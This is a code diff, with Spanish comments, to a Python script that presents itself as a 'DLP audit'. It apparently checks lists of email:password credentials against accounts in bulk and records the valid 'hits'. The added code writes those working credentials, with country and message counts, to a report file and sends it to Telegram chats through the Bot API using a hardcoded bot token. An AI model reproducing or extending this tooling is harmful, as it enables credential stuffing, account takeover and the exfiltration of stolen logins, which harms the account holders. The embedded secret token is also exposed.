@@ -3,6 +3,7 @@ import sys
 import time
 import threading
 import base64
+import requests
 from urllib.parse import urlparse
 
 try:
@@ -50,10 +51,11 @@ class DummyQueue:
 
 def process_file_and_scan(file_path, target_notif_chat=None):
     print("📥 Archivo detectado. Iniciando Auditoría DLP automática...")
+    hits_buffer = []
     
     # 1. Read file
     try:
-        with open(file_path, "r", encoding="utf-8") as f:
+        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
             creds_text = f.read()
     except Exception as e:
         print(f"❌ Error leyendo archivo: {e}")
@@ -86,14 +88,73 @@ def process_file_and_scan(file_path, target_notif_chat=None):
     for cred in valid_creds:
         email, pwd = cred.split(':', 1)
         try:
-            # We don't use tg_chat_id here since server.py uses the Bot to send messages.
-            # If server.py Bot is configured, the Hits will go to the Bot's chat. 
-            # We pass multi_user=True to evaluate all registered database users.
-            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True)
+            # We pass multi_user=True and the hit_buffer
+            run_audit(dummy_q, email.strip(), pwd.strip(), multi_user=True, hit_buffer=hits_buffer)
         except Exception as e:
             print(f"Error scanning {email}: {e}")
             
     print(f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada.")
+
+    # 4. Consolidated Reporting
+    if hits_buffer:
+        print(f"📦 Enviando reporte consolidado de {len(hits_buffer)} HITs...")
+        send_consolidated_report(hits_buffer)
+    else:
+        print("✅ No se encontraron HITs en este lote.")
+
+def send_consolidated_report(hits):
+    # Group by category (Match)
+    categories = {}
+    for h in hits:
+        cat = h['match']
+        if cat not in categories: categories[cat] = []
+        categories[cat].append(h)
+
+    # 1. Create Summary Text
+    summary_lines = ["📊 *REPORTE DE AUDITORÍA DLP* 📊", "━━━━━━━━━━━━━━━━━━"]
+    for cat, items in categories.items():
+        summary_lines.append(f"✅ *{cat}*: `{len(items)}` aciertos")
+    summary_lines.append("\n📄 _Detalles completos en el archivo adjunto_")
+
+    # 2. Create detailed TXT
+    report_name = f"reporte_hits_{int(time.time())}.txt"
+    report_path = os.path.join("incoming_targets", report_name)
+    
+    with open(report_path, "w", encoding="utf-8") as f:
+        f.write("DLP AUDIT PRO - REPORTE DE HITS\n")
+        f.write("="*40 + "\n\n")
+        
+        for cat, items in categories.items():
+            f.write(f"[{cat}]\n")
+            f.write("-" * 20 + "\n")
+            for h in items:
+                line = f"{h['email']}:{h['pass']} | Pais: {h['country']} | Msgs: {h['total']}\n"
+                f.write(line)
+            f.write("\n")
+
+    # 3. Send to Telegram using the Bot Token
+    # We use requests here to keep it simple and detached from Telethon's main loop if needed
+    # but since this script is already a Telethon client, we could use client.send_file.
+    # However, since process_file_and_scan runs in a Thread, we'll use requests to the Bot.
+    
+    token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
+    
+    # We notify ALL unique chat_ids found in the hits
+    target_chats = set([h['chat_id'] for h in hits])
+    
+    for cid in target_chats:
+        try:
+            # Send message
+            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
+                          json={"chat_id": cid, "text": "\n".join(summary_lines), "parse_mode": "Markdown"})
+            
+            # Send file
+            with open(report_path, "rb") as f:
+                requests.post(f"https://api.telegram.org/bot{token}/sendDocument",
+                              data={"chat_id": cid},
+                              files={"document": f})
+        except Exception as e:
+            print(f"Error enviando reporte bot: {e}")
 
 def fire_and_forget_scan(file_path):
     # This runs in a background thread, far away from Telethon's asyncio loop
